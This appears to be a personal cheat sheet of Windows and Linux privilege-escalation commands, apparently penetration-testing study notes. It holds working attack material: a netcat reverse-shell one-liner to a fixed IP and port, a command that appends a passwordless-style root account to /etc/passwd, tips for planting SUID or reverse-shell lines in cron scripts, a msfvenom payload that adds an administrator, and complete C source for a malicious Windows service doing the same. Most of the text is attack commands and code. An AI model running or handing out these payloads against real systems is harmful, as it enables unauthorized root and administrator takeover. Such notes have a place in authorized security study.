

================================================================================================================
						windows commands
================================================================================================================

whoami
whoami /groups
whoami /priv
net user   -----> who is the users on the system
net user abood
net localgroup Administrator
hostname
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
tasklist /SVC     ------> user services
ipconfig /all
route print
netstat -ano  -----> open ports

#firewall enum
netsh advfirewall show currentprofile
netsh advfirewall firewall show rule name=all

schtasks /query /fo LIST /v    	------> schedual tasks

wmic product get name, version, vendor     ------> all the installed application 

wmic qfe get Caption, Description, HotFixID, InstalledOn, ....    ------> all the updates and patches 

acceschk.exe -uws "Everyone" "C:\Program Files"       ------> all the writable files miss configration

Get-ChildItem "C:\Program Files" -R ecurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}    ------> all the writable files miss configration

mountvol

driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path      ------> Device drivers and kernel modules

Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}  ------>  get versions too


Get-WmiObject Win32_service | Select-Object Name, state, PathName | Where-Object {$_.State -like 'Running'}   ------> display all the running services and paths then:

icacls.exe "<the service PATH>"     ------> get service status like we did in powerUP 

sc start myfile.exe

reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer    	---------> check the USER registry

reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer      ---------> check the MACHINE registry

powershell.exe Start-Process cmd.exe -Verb runAs      -------> to run cmd as administartor

sigcheck.exe -a -m "service PATH"



================================================================================================================
						linux commands
================================================================================================================

sudo -l
whoami
id
cat /etc/passwd   -----> the users on the system
hostname
uname -a 
cat /etc/issue  -----> kernel information
ps aux     -----> all services even the root

ifconfig, ip ad s
/sbin/route
ss -anp    -----> open ports

#firewall enum
iptables 

cat /etc/crontap     ------> all the schedual scripts,add 'chmod u+s' to the script we can access,then write /bin/bash -p ---> to escape user suid or write on line reverse shell like :
 
rm /tmp/f;mkfifo /tmp/f|/bin/sh -i 2>&1|nc 192.168.64.134 5555 > /tmp/f

dpkg -l or rpm

find / -writable -type d 2>/dev/null 	------> all the writable files miss configration

find / -perm -u=s type f 2>/dev/null

mount
lsmod ------> Device drivers and kernel modules
modinfo <module>   -----> extra information

echo "root5:<openssl passwd evil>:0:0:root:/root:/bin/bash" >> /etc/passwd  ------> exploit miss configuration /etc/passwd 



===============================================================================================================
===============================================================================================================

tools can enumerate all the above:

windows-privesc-check
watson
shelrock
PowerSploit/Privesc/PowerUp
windows-exploit-suggester
JWAS
WinPEAS.exe and .bat
linPEAS and LinEnum

===============================================================================================================
make msfvenom to exploit unqouted directories:
msfvenom -p windows/exec CMD='net localgroup administrator user /add' -f exe -o myfile.exe

===============================================================================================================
to use powerup:

powershell import-module .\powerup.ps1
Invoke-AllChecks

icacls.exe "<application directory>"  -----> to ensure what we found in powerup

then we use the script below to make our expolit file after compile it

===============================================================================================================




#include <windows.h>
#include <stdio.h>

#define SLEEP_TIME 5000

SERVICE_STATUS ServiceStatus; 
SERVICE_STATUS_HANDLE hStatus; 
 
void ServiceMain(int argc, char** argv); 
void ControlHandler(DWORD request); 

//add the payload here
int Run() 
{ 
    system("cmd.exe /k net localgroup administrators user /add");
    return 0; 
} 

int main() 
{ 
    SERVICE_TABLE_ENTRY ServiceTable[2];
    ServiceTable[0].lpServiceName = "MyService";
    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;

    ServiceTable[1].lpServiceName = NULL;
    ServiceTable[1].lpServiceProc = NULL;
 
    StartServiceCtrlDispatcher(ServiceTable);  
    return 0;
}

void ServiceMain(int argc, char** argv) 
{ 
    ServiceStatus.dwServiceType        = SERVICE_WIN32; 
    ServiceStatus.dwCurrentState       = SERVICE_START_PENDING; 
    ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwWin32ExitCode      = 0; 
    ServiceStatus.dwServiceSpecificExitCode = 0; 
    ServiceStatus.dwCheckPoint         = 0; 
    ServiceStatus.dwWaitHint           = 0; 
 
    hStatus = RegisterServiceCtrlHandler("MyService", (LPHANDLER_FUNCTION)ControlHandler); 
    Run(); 
    
    ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
    SetServiceStatus (hStatus, &ServiceStatus);
 
    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
    {
        Sleep(SLEEP_TIME);
    }
    return; 
}

void ControlHandler(DWORD request) 
{ 
    switch(request) 
    { 
        case SERVICE_CONTROL_STOP: 
            ServiceStatus.dwWin32ExitCode = 0; 
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
            SetServiceStatus (hStatus, &ServiceStatus);
            return; 
 
        case SERVICE_CONTROL_SHUTDOWN: 
            ServiceStatus.dwWin32ExitCode = 0; 
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
            SetServiceStatus (hStatus, &ServiceStatus);
            return; 
        
        default:
            break;
    } 
    SetServiceStatus (hStatus,  &ServiceStatus);
    return; 
}







